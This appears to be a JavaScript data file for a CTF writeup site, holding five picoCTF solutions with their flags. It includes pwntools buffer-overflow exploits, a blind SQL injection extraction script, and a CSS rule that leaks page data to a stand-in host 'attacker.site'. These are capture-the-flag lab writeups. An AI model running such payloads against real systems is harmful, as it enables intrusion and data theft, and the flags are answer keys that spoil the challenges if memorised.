// ============================================================
//  writeups.js — CTF Writeup Data
//  Edit this file to add/remove writeups, or use the admin
//  panel on the site (Login → manage → Export & commit).
// ============================================================

window.WRITEUPS = [
    {
      id: 'heap-overflow',
      platform: 'picoCTF',
      difficulty: 'hard',
      date: '2025-03-10',
      title: 'Heap Buffer Overflow',
      category: 'Binary Exploitation',
      tags: ['pwntools', 'heap', 'buffer overflow'],
      excerpt: 'Exploited a heap buffer overflow to overwrite a function pointer and redirect execution, solved remotely via pwntools.',
      body: `## Overview
  A heap-based challenge where overflowing a chunk overwrote an adjacent function pointer.
  
  ## Environment
  Remote server. Binary provided for local analysis using GDB + PEDA.
  
  ## Approach
  Mapped the heap layout, identified chunk sizing mismatch — 24 byte allocation accepting 40 bytes input. The 16-byte overflow reached the function pointer in the next chunk.
  
  ## Null Byte Issue
  Initial payload had a null byte at the boundary. Adjusted padding to avoid null termination stripping.
  
  ## Exploit
  \`\`\`python
  from pwn import *
  
  p = remote('challenge.ctf.example', 4444)
  win_addr = 0x08049256
  
  payload  = b'A' * 24
  payload += p32(win_addr)
  
  p.sendline(payload)
  p.interactive()
  \`\`\``,
      flag: 'picoCTF{h34p_0v3rfl0w_pwn3d}'
    },
    {
      id: 'aes-cbc',
      platform: 'picoCTF',
      difficulty: 'hard',
      date: '2025-02-18',
      title: 'AES-CBC Dot Product Oracle',
      category: 'Cryptography',
      tags: ['AES', 'CBC', 'MILP', 'oracle'],
      excerpt: 'Dynamic session oracle where dot product relationships between plaintexts and key bytes were exploited via MILP to recover the key.',
      body: `## Overview
  AES-CBC oracle returning a 1-bit response based on a dot product condition between plaintext and key bytes.
  
  ## Session Parsing
  \`\`\`python
  import base64, json
  
  def parse_session(token):
      decoded = base64.b64decode(token)
      return json.loads(decoded)
  \`\`\`
  
  ## MILP Model
  Each oracle response added a linear constraint over key bytes [0,255].
  
  \`\`\`python
  from mip import Model, xsum, INTEGER
  
  m = Model()
  key = [m.add_var(var_type=INTEGER, lb=0, ub=255) for _ in range(16)]
  
  for pt, result in queries:
      expr = xsum(pt[i]*key[i] for i in range(16))
      if result == 1:
          m += expr >= 1
      else:
          m += expr == 0
  
  m.optimize()
  recovered = bytes([int(k.x) for k in key])
  \`\`\``,
      flag: 'picoCTF{d0t_pr0duct_0r4cl3}'
    },
    {
      id: 'css-exfil',
      platform: 'picoCTF',
      difficulty: 'medium',
      date: '2025-01-29',
      title: 'CSS Cookie Exfiltration',
      category: 'Web Exploitation',
      tags: ['CSS', 'no-JS', 'cookie', 'oracle'],
      excerpt: 'Cookie exfiltration using only CSS attribute selectors — no JavaScript allowed. Built a character oracle using CSS import chains.',
      body: `## Overview
  CSP blocked all JS. Flag was in a session cookie accessible to the page. Goal: exfiltrate using CSS only.
  
  ## CSS Attribute Selector Oracle
  \`\`\`css
  input[value^="picoCTF{a"] {
      background: url('https://attacker.site/leak?c=a');
  }
  \`\`\`
  
  ## Automation
  Injected 62 rules per character position. Captured callbacks on a local server.
  
  \`\`\`python
  from http.server import HTTPServer, BaseHTTPRequestHandler
  
  hits = []
  class H(BaseHTTPRequestHandler):
      def do_GET(self):
          hits.append(self.path)
          self.send_response(200); self.end_headers()
  
  HTTPServer(('0.0.0.0', 8080), H).serve_forever()
  \`\`\`
  
  Reconstructed flag character by character.`,
      flag: 'picoCTF{css_0r4cl3_l34k}'
    },
    {
      id: 'sqli',
      platform: 'picoCTF',
      difficulty: 'medium',
      date: '2024-12-14',
      title: 'SQL Injection — CSV Report',
      category: 'Web Exploitation',
      tags: ['SQLi', 'Burp Suite', 'SQLite', 'blind'],
      excerpt: 'Blind SQL injection via a CSV report endpoint. Extracted the flag from SQLite using SUBSTR-based inference, automated with Python.',
      body: `## Overview
  CSV report endpoint passed user input directly into a SQLite query.
  
  ## Discovery
  Intercepted in Burp Suite. The \`type\` parameter was injectable:
  \`GET /report?type=sales' --\`
  
  ## Extraction
  \`\`\`python
  import requests, string
  
  flag = ''
  for i in range(1, 50):
      for c in string.printable:
          r = requests.get(
              'http://chall/report',
              params={'type': f"sales' AND SUBSTR((SELECT flag FROM secrets),{i},1)='{c}' --"}
          )
          if 'Error' not in r.text:
              flag += c; break
      if '}' in flag: break
  
  print(flag)
  \`\`\``,
      flag: 'picoCTF{bl1nd_sql1_ftw}'
    },
    {
      id: 'funcptr',
      platform: 'picoCTF',
      difficulty: 'medium',
      date: '2024-11-22',
      title: 'Function Pointer Overwrite',
      category: 'Binary Exploitation',
      tags: ['buffer overflow', 'function pointer', 'pwntools'],
      excerpt: 'Stack-based overflow to overwrite a function pointer in an adjacent struct. Required careful null byte avoidance in the payload.',
      body: `## Overview
  Global struct with a \`char buf[32]\` and a function pointer. \`gets()\` — no bounds check.
  
  ## Exploit
  \`\`\`python
  from pwn import *
  
  elf = ELF('./chall')
  win = elf.symbols['win']
  
  p = remote('chall.ctf.example', 9999)
  payload = b'A'*32 + p32(win)
  p.sendline(payload)
  p.interactive()
  \`\`\``,
      flag: 'picoCTF{funcptr_0v3rwr1t3}'
    }
  ];